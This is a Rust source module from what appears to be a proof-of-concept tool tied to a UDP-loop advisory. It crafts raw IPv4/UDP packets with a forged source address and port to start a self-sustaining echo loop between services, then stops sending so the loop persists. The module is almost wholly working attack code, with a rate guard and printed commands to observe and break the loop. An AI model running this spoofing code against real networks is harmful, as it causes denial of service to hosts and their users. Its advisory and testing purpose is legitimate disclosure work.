//! loop-seed: spoofed echo-loop seeding (advisory §3.3, spoof guide §5).
//!
//! Crafts UDP datagrams with an attacker-chosen source IP + source port to seed
//! the self-sustaining echo loop, then STOPS transmitting so verification can
//! confirm the loop persists unattended.
//!
//! Requires Linux, CAP_NET_RAW, a fabric without anti-spoofing, and the `spoof`
//! Cargo feature. On any other build this module returns a clear error.

use crate::cli::{GlobalGuards, LoopSeedArgs};
use crate::guard;
use std::io;

#[cfg(all(target_os = "linux", feature = "spoof"))]
pub fn run(args: LoopSeedArgs, guards: &GlobalGuards) -> io::Result<()> {
    use crate::cli::LoopMode;
    use std::net::Ipv4Addr;

    if !(1..=4).contains(&args.payload_len) {
        return Err(io::Error::new(
            io::ErrorKind::InvalidInput,
            format!("seed payload_len must be in 1..=4 (got {})", args.payload_len),
        ));
    }
    // Seeding sends `seeds` packets in a burst; treat as a 1s / seeds-pps action.
    guard::authorize(guards, args.seeds as u64, 1)
        .map_err(|e| io::Error::new(io::ErrorKind::PermissionDenied, e.to_string()))?;

    let a: Ipv4Addr = args
        .a
        .parse()
        .map_err(|_| io::Error::new(io::ErrorKind::InvalidInput, "invalid --a IPv4"))?;

    let (src_ip, dst_ip) = match args.mode {
        LoopMode::SelfLoop => (a, a),
        LoopMode::AB => {
            let b: Ipv4Addr = args
                .b
                .as_deref()
                .ok_or_else(|| io::Error::new(io::ErrorKind::InvalidInput, "a-b mode requires --b"))?
                .parse()
                .map_err(|_| io::Error::new(io::ErrorKind::InvalidInput, "invalid --b IPv4"))?;
            (b, a) // make A believe a short packet arrived from B:port
        }
    };

    let payload = vec![0u8; args.payload_len];
    eprintln!(
        "[loop-seed] mode={:?} src={}:{} -> dst={}:{} seeds={} payload_len={}",
        args.mode, src_ip, args.port, dst_ip, args.port, args.seeds, args.payload_len
    );
    for i in 0..args.seeds {
        send_spoofed(src_ip, args.port, dst_ip, args.port, &payload)?;
        eprintln!("[loop-seed] sent seed {}/{}", i + 1, args.seeds);
    }
    eprintln!("[loop-seed] done. STOPPED transmitting.");
    eprintln!("[loop-seed] verify persistence:  sudo tcpdump -ni any 'udp port {}' -ttt", args.port);
    eprintln!("[loop-seed] break the loop:       sudo iptables -A INPUT -p udp --dport {p} -j DROP; \
               sudo iptables -A OUTPUT -p udp --sport {p} -j DROP", p = args.port);
    Ok(())
}

/// Craft and send ONE spoofed IPv4/UDP datagram via a raw Layer3 channel.
#[cfg(all(target_os = "linux", feature = "spoof"))]
fn send_spoofed(
    src_ip: std::net::Ipv4Addr,
    src_port: u16,
    dst_ip: std::net::Ipv4Addr,
    dst_port: u16,
    payload: &[u8],
) -> io::Result<()> {
    use pnet::packet::ip::IpNextHeaderProtocols;
    use pnet::packet::ipv4::{checksum as ipv4_checksum, MutableIpv4Packet};
    use pnet::packet::udp::{ipv4_checksum as udp_ipv4_checksum, MutableUdpPacket};
    use pnet::transport::TransportChannelType::Layer3;
    use pnet::transport::transport_channel;

    const IP_HDR: usize = 20;
    const UDP_HDR: usize = 8;
    let total = IP_HDR + UDP_HDR + payload.len();
    let mut buf = vec![0u8; total];

    {
        let mut ip = MutableIpv4Packet::new(&mut buf).unwrap();
        ip.set_version(4);
        ip.set_header_length(5);
        ip.set_total_length(total as u16);
        ip.set_ttl(64);
        ip.set_next_level_protocol(IpNextHeaderProtocols::Udp);
        ip.set_source(src_ip);
        ip.set_destination(dst_ip);
        let c = ipv4_checksum(&ip.to_immutable());
        ip.set_checksum(c);
    }
    {
        let mut udp = MutableUdpPacket::new(&mut buf[IP_HDR..]).unwrap();
        udp.set_source(src_port);
        udp.set_destination(dst_port);
        udp.set_length((UDP_HDR + payload.len()) as u16);
        udp.set_payload(payload);
        let c = udp_ipv4_checksum(&udp.to_immutable(), &src_ip, &dst_ip);
        udp.set_checksum(c);
    }

    let (mut tx, _rx) = transport_channel(4096, Layer3(IpNextHeaderProtocols::Udp))
        .map_err(|e| io::Error::new(io::ErrorKind::Other, format!("raw socket (need CAP_NET_RAW): {e}")))?;
    let pkt = MutableIpv4Packet::new(&mut buf).unwrap();
    tx.send_to(pkt.to_immutable(), std::net::IpAddr::V4(dst_ip))?;
    Ok(())
}

#[cfg(not(all(target_os = "linux", feature = "spoof")))]
pub fn run(_args: LoopSeedArgs, _guards: &GlobalGuards) -> io::Result<()> {
    let _ = guard::authorize; // keep import used on all targets
    Err(io::Error::new(
        io::ErrorKind::Unsupported,
        "loop-seed (source-IP spoofing) requires a Linux build with `--features spoof` \
         and CAP_NET_RAW. Windows blocks raw spoofed UDP; see ZUDP-2026-001-udp-spoof-poc-impl.md §2. \
         The attack/probe/harness subcommands do NOT need spoofing and work here.",
    ))
}
